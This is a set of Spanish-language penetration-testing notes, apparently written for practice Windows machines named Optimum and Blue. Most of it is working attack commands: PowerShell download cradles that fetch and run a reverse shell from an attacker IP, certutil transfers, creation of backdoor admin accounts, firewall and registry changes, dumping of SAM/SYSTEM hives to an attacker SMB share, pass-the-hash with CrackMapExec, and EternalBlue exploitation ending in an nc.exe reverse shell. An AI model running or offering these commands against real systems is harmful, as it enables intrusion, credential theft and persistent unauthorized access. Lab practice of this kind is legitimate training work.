**DCShadow y DCSync con mimikatz -> actualizacion de objetos de un DC **


# MAQUINA OPTIMUM
rlwrap permite tener una shell mas interactiva con historico en las flechas:

```
rlwrap nc -nlvp 443
```

ruta absoluta de powershell: 

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
```

Invoke-PowershelTcp.ps1 de nishang para obtener una reverse powershell

Es recomendable tener la version del sistema operativo y el proceso de la powershell de la misma arquitectura 32 o 64 bits

verficar la arquitectura del sistema operativo desde powershell: 

```
[Environment]::Is64BitOperatingSystem (True o False)
```

verficar la arquitectura del proceso de la terminal desde powershell: 

```
[Environment]::Is64BitProcess (True o False)
```

para unificar la version de ambos es mejor invokar desde la ruta absoluta de la powershell

```
start /b C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object WebClient).downloadString("http://<ip-atacante>8000/Invoke-PowershelTcp.ps1")
(start /b lo pone en segundo plano)
```

## NISHANG

Invoke-PowershellTcp.ps1 -> reverse powershell

## windows exploit suggester

**wesng**

https://github.com/bitsadmin/wesnghttps://github.com/bitsadmin/wesng (invocar el allchecks al final)

coger el output del systeminfo en un txt y correr el explopit 

```
(EJ: python wes.py system.txt -i "Elevation of Privilege") -i para filtrar
```

**sherlock**
https://github.com/rasta-mouse/Sherlock (invocar el find-allvuns)

**windows exploit suggester**
https://github.com/AonCyberLabs/Windows-Exploit-Suggester

```
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt
apt-get install python-xlrd -y (en caso de que de error)
```

# FORMAS DE TRANSFERIR ARCHIVOS

## MAQUINA ATACANTE CON PYTHON HTTP

**SI ESTAMOS EN EL CMD**

```
start /b C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object WebClient).downloadString("http://<ip-atacante>8000/Invoke-PowershelTcp.ps1")
```

**SI ESTAMOS EN UNA POWERSHELL**

```
IEX(New-Object WebClient).downloadString("http://<ip-atacante>8000/Invoke-PowershelTcp.ps1")
```

**CON CERTUTIL**

```
certutilexe -f -urlcache -split  http<ip-atacante>:8000/bfill.exe nombredeloutput.exe
```

**OTRA FORMA CON POWERSHELL DESDE EL CMD**

```
powershell -c "(New-Object System.Net.WebCliente).DownloadFile('http://<ip-atacante>:8000/bfill.exe','C:\ruta\de\destino\en\la\maquina\windows\bfill.exe')"
```

**OTRA FORMA CON POWERSHELL DESDE EL CMD**

```
powershell Invvoke-WebRequest "http://<ip-atacante>:8000/bfill.exe" -OutFile "C:\ruta\de\destino\en\la\maquina\windows\bfill.exe"
```

### FORMA CON IMPACKET-SMBSERVER

**MAQUINA ATACANTE**

mostamos un servidor samba.
nos dirigimos ala ruta del archivo que queremos transferir y ponemos:

```
impacket-smbserver sambaFolder $(pwd) (pwd le decimos que comparta la ruta actual)
```

**MAQUINA VICTIMA (DESDE POWERSHELL)**

```
New-PSDrive -name "sharedFolder" -PSProvider "FileSystem" -Root "\\<ip-atacante>\sambaFolder" (sambaFolder coincide con el que definimos)

dir sharedForlde:\ (vemos el contenido que queremos transferir)

copy sharedFolder:\bfill.exe C:\ruta\de\destino\en\la\maquina\windows\bfill.exe (copiamos lo que queremos transferir a la maquina victima)
```

## ELEVACION DE PRIVILEGIOS

MS16-098 -> bfill.exe

MS16-032 -> 

MS14-070 -> KERNEL

MS16-012 -> KERNEL

MS11-046 -> KERNEL

## EXPLOITS

## PERSISTENCIA

Una vez ya seamos administradores:

```
net user chris chris123 /add
net localgroup Administrators chris /add
net localgroup Administrators (comprobacion)
```

## ABRIR UN PUERTO DESDE CMD 

Una vez ya seamos administradores:
SAMBA 445:

```
netstat -nat (ver los puertos abiertos de la maquina windows)(los puertos inhost estan abiertos pero no publicos)

netsh advfirewall firewall add rule name="Samba port" protocol=TCP dir=in localport=445 action =allow (trafico entrante)

netsh advfirewall firewall add rule name="Samba port" protocol=TCP dir=out localport=445 action =allow (trafico saliente)

```

podemos comprobar desde la maquina atacante:

```
nmap -p445 --open -T5 -v -n <ip-victima-windows>
```

y deberia salir open

## CRACKMAPEXEC

Cuando el samba esta abierto en la maquina windows

Uso basico configurando la pipen shell:

```
apt-get install -y libssl-dev libffi-dev python-dev build-essential 
pip install --user pipenv git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec 
cd CrackMapExec && pipenv install 
pipenv shell 
python setup.py install
```

Se recomienda utilizar pipenv para evitar conflictos entre el sistema y los paquetes CME. Los siguientes comandos deben ejecutarse para instalar CrackMapExec usando pipenv.


```
cme smb 10.10.10.8 -u 'chris' -p 'chris123'
```

Si es la primera vex que lo corres, no pasara nada y lo tiene que volver a correr.

si sale [+] es que las credenciales son validas

si sale PWNED! puedes ejecutar comandos remotamente o entablarte una reverse shell con herramientas como psexec

para que salga PWNED (si no sale) ha que modificar una clave de registro y crear un recurso compartido para **psexec**

Desde cmd:

recurso compartido

```
net share attacker_forder=C:\Windows\Temp /GRANT Administrator,FULL
```

cambio en el registro

```
cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

lo buene de qwue salga pwn3d! es que con el parametro -x podemos ejecutar comandos

```
cme smb 10.10.10.8 -u 'chris' -p 'chris123' -x 'whoami'
```

con el parametro --sam extraemos todoos lo hashes SAM (pero el usuario tiene que decir pwn3d!)

```
cme smb 10.10.10.8 -u 'chris' -p 'chris123' --sam
```

con el parametro "--ntds vss" extraemos todos lo hashes NTLM de los usuarios(pero el usuario tiene que decir pwn3d!) **SOLO PARA DIRECTORIO ACTIVO**

```
cme smb 10.10.10.8 -u 'chris' -p 'chris123' --ntds vss
```

con el parametro -H hacemos pass the hash para cualquier usuario

```
cme smb 10.10.10.8 -u 'administrator' -H 'aad3457b3aac323423:67655f54e56' -x 'whoami'
```

## PSEXEC IMPACKET

descargamos el repo

https://github.com/SecureAuthCorp/impacket

```
python setup.py install

updatedb

(esto sirve como una persistencia para despues entrarse directamente)

psexec.py WORKGROUP/chris:chris123@<ip-victima> comando(cmd.exe) (si tiene caracteres especiales el usuario o contraseña es mejor usar delante \ EJ: \! \% \$)

```


## SAMBAMAP



## SMBCLIENT


## PTH-WINEXE

con esto podemos obtener una shell reversa haciendo pass the hash

```
pth-winexe -u WORKGROUP/Administrator%<HASH> //<IP-VICTIMA> cmd.exe
```

## OBTENER LOS HASHES SAM  NTLM DE FORMA MANUAL

los hashes se encuentran en los registros HKLM\SAM y HKLM\SYSTEM

dirigirse a Windows\temp para realizar esta operacion

se encuentran ubicados en el sstem32 pero no podemos interactuar con ellos ya que estan siendo usados por el sistema

Pues una ez entablada una reverse shell con la maquina victima windows y estemos ahi nos vamos al escritorio por ejemplo y nos cooopiamos un backup de esos registros para poder utilizarlos sin problema

reg save HKLM\SAM SAM.backup

reg save HKLM\SYSTEM SYSTEM.backup

**AHORA NOS PASAMOS ESOS ARCHIIVOS A NUESTRA MAQUINA DE ATACANTE MEDIANTE IMPACKET**

MAQUINA ATACANTE

```
impacket-smbserver smbFolder $(pwd)
```

MAQUINA VICTIMA (WINDOWS)

```
copy SAM.backup \\<ip-atacante>\smbFolder\SAM

copy SYSTEM.backup \\<ip-atacante>\smbFolder\SYSTEM
```

EN CASO DE PROBLEMAS CON WINDOWS 10

puede que de problemsa con windows 10 ya que no acepta el servidor samba de impacket, pero eso se soluciona con una flag -smb2support

```
impacket-smbserver smbFolder $(pwd) -smb2support
```

OBTENER LOS HASHES

Hay una herramienta llamada "pwdump" para que a partir de estos archivos nos pase los hashes

esto desde la maquina atancante

```
pwdump SAM SYSTEM
```

**NOTA**

Estos hashes sirven para hacer pass the hash (SAM y NTLM)
El hash NET-NTLM no siirve para hacer el pass the hash


## ALTERNATIIVA A UNA REVERSE SHELL CON RDP

para tener un entorno de escritorio remoto de la victima podemos hacer uso del protocolo RDP y con herramientas como xfreerdp obtener la conexion remota al equipo victima coon entorno grafico.

crear un usuario en la maquina victima(si todavia no se creo) y agregarlo al grupo de conexioones remotas.

```
net user chris chris123 /add
net localgroup "Remote Desktop Users" chris /add
```

modificar el firewall y una clave de registro para habilitar el servicio RDP

maquina windows

```
netsh adfirewall firewall add rule name="RDP Port" protocol=TCP  dir=in localport=3389 action=allow

netsh adfirewall firewall add rule name="RDP Port" protocol=TCP  dir=out localport=3389 action=allow

reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" / fDenyTSConnections /t REG_DWORD /d 0 /f (lo ponemos en 0)
```

```
apagar
NetSh Advfirewall set allprofiles state off

encender
NetSh Advfirewall set allprofiles state on

ver estatus
Netsh Advfirewall show allprofiles

eligiendo un profile en especifico
```

maquina atacante

instalamos xfreerdp

```
xfreerdp /u:chris /d:WORKGROUP /p:chris321\! /v:<ip-atacante>
```

Esto abriira una pantalla con acceso a niel de interaccion con la maquina victima

# MAQUINA BLUE

## PUERTOS ALTOS NO INTERESANTES (NO SE PUEDE EXPLOTARLOS)

49152-49153-49154-49155-4915249156-49157

## EXPLOTACION POR SAMBA 

Puerto 445

si vemos que esta el servicio samba abierto usamos lo siguiente para enumerar:

smbmap para ver los recursos compartidos

```
smbmap -H <ip-victima>
```

en caso de dar access deny, intentamos autenticarnos con un null sesion:

```
smbmap -H <ip-victima> -u 'null'
```

otra forma de ver es con sambaclient:

```
smbclient -L <ip-victima>

con null sesion

smbclient -L <ip-victima> -N
```

autenticarnos sobre un recurso compartido

```
smbclient -L <ip-victima>/carpetadelrecursocompartido -N
```




en caso de ser una maquina windows 7 cn el samba abierto se tiene el famoso ataque de ethernalblue (MS17-010), existe un script de nmap para verificar si es vulnerable para este ataque

```
nmap --script "vuln and safe" -p445 <ip-victima> -oN vulnScan
```





## common windows port

Port	Service name	Transport protocol
 20,21	 File Transfer Protocol (FTP)	 TCP
 22	 Secure Shell (SSH)	 TCP and UDP
 23	 Telnet	 TCP
 25	 Simple Mail Transfer Protocol (SMTP)	 TCP
 50,51	 IPSec	 
 53	 Domain Name System (DNS)	 TCP and UDP
 67,68	 Dynamic Host Configuration Protocol (DHCP)	 UDP
 69	 Trivial File Transfer Protocol (TFTP)	 UDP
 80	 HyperText Transfer Protocol (HTTP)	 TCP
 110	 Post Office Protocol (POP3)	 TCP
 119	 Network News Transport Protocol (NNTP)	 TCP
 123	 Network Time Protocol (NTP)	 UDP
 135-139	 NetBIOS	 TCP and UDP
 143	 Internet Message Access Protocol (IMAP4)	 TCP and UDP
 161,162	 Simple Network Management Protocol (SNMP)	 TCP and UDP
 389	 Lightweight Directory Access Protocol	 TCP and UDP
 443	 HTTP with Secure Sockets Layer (SSL)	 TCP and UDP
 989,990	 FTP over SSL/TLS (implicit mode)	 TCP
 3389	 Remote Desktop Protocol	 TCP and UDP


## LEER MAS RAPIDO ELCONTENIDO COMPARTIDO DE UN SAMBA A TRAVES DE MOUNT

una vez que nos autenticamos en un seridor samba a traves de smbmap o smbclient podemos traer una montura de todo el contenido al que tenemos acceso a la maquina atacante (parrot) para una mejor movilidad.

Es como traerse todos los archivos y carpetas a la maquina, no es eso lo que sucede en realidad solo es una montura

nos dirigimos a la ruta /mnt y nos creamos una carpeta de referenciaen la maquina atacante:

```
cd /mnt
mkdir contenidoSamba
```

montamos el recursocompartido en la carpeta creada

```
mount -t cifs //<ip-victima>/recursoCompartido /mnt/contenidoSamba -o username=null,password=null,domain=WORKGROUP,rw
```

en caso de no ser un null session ponemos las credenciales en usuarname y password.
El rw es el modo lectura y escritura

Con eso ya se nos creara una montura de todo el recurso compartido en nuestra maquina para poder analizar mejor

**para ver los permisos de los archivos**

el ls -l no mustra los permisos reales de los archivos, se debe hacer uso de "smbcacls"

mediante bash podemos grepear para ver los permisos de manera mas clara

```
smbcacls //<ip-victima>/recursoCompartido carpeta/subcarpeta -N

-N en caso de ser una null session
-u y -p caso contrario especificando usuario o contraseña

```

podemos crear una forma recursiva de hacer esto por su hay muchas carpetas y subcarpetas

```
for file in $(ls);do echo $file; done | grep -v -i "^ntuser" | while read line; do echo -e "\n[*] $line \n"; smbcacls //<ip-victima>/recursoCompartido CarpetaRaiz/$line -N | grep -i "everyone"; done
```

Esto nos mostrara por carpeta y de manera recursiva los permisos que tenemos segun el fichero o carpeta

para quitar la montura hacemos lo siguiente:

```
umount /mnt/contenidoSamba
```

## EXPLOTACION DE UN ETERNAL BLUE

exploits:

autoblue [https://github.com/3ndG4me/AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)

zzz_exploit [https://github.com/worawit/MS17-010](https://github.com/worawit/MS17-010)


**zzz_exploit**

una vez clonado el repo, contiene un checker para el ethernal blue

```
python checker.py <ip-victima>
```

Basta que un named pipe diga "ok" y listo podemos aplicar el exploit con ese named pipe

para usar este exploit debemos modificar el zzz_exploit.py, comentar el contenido de la funcion "smb_pwn" y solo descomentar las siguientes lineas

```
smbConn = conn.get_smbconnection()
service_exec(conn,r'cmd /c <comando-del-atacante>')

EJ: \\<ip-atacante>\sambaFolder\nc.exe -e cmd <ip-atacante> 4646
```

a la hora de ejecutar este script, ejecutara el comando
esto es valido si algun named pipe da "ok"

**autoblue**

En caso de no dar el zzz_exploit

tiene un checker tambien:

```
python ethernal_checker.py <ip-victima>
```

primero debemos generar un shellcode

```
cd shellcode

./shell_prep.sh

Y

<ip-atacante>

<puerto> para 64 bits

<puerto> para 32 bits

1

1
```

Con esto se crea el shellcode "sc_all.bin", sirve para 32 y 64 bits por lo que antes de ejecutar el exploit nos debemos poner a la escucha en dos netcats, uno con el puerto definido para 32 bits y otro para 64 bits

```
32 bits
rlwrap nc -nlvp <puerto-32-bits>

64 bits
rlwrap nc -nlvp <puerto-64-bits>
```

Ejecutamos el exploit autoblue

en caso de ser windows 7

```
python ethernalblue_exploit7.py <ip_victima> shellcode/sc_all.bin
```

en caso de ser windows 10

```
python ethernalblue_exploit10.py <ip_victima> shellcode/sc_all.bin
```

Y en uno de los escucha de netcat debe aparecer un cmd como NT-AUTORITY/SYSTEM

Ahora podemos crearnos una persistencia creando un usuario coomo administrador y despues tratar de dumpear hashes con crackmapexec

